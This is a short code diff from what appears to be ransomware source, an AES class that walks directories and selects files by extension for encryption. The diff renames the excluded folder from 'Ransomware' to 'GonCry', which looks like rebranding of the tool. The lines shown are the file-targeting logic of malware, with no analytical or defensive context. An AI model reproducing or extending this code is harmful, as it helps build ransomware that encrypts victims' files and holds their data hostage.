@@ -14,7 +14,7 @@ class AES:
             for file in files:
                 abspath = os.path.join(root, file)
 
-                if 'Ransomware' in root.split('\\'):
+                if 'GonCry' in root.split('\\'):
                     continue
 
                 if not abspath.split('.')[-1] in self.file_targets:
@@ -27,7 +27,7 @@ class AES:
             for file in files:
                 abspath = os.path.join(root, file)
 
-                if 'Ransomware' in root.split('\\'):
+                if 'GonCry' in root.split('\\'):
                     continue
 
                 if not abspath.split('.')[-1] in self.file_targets:
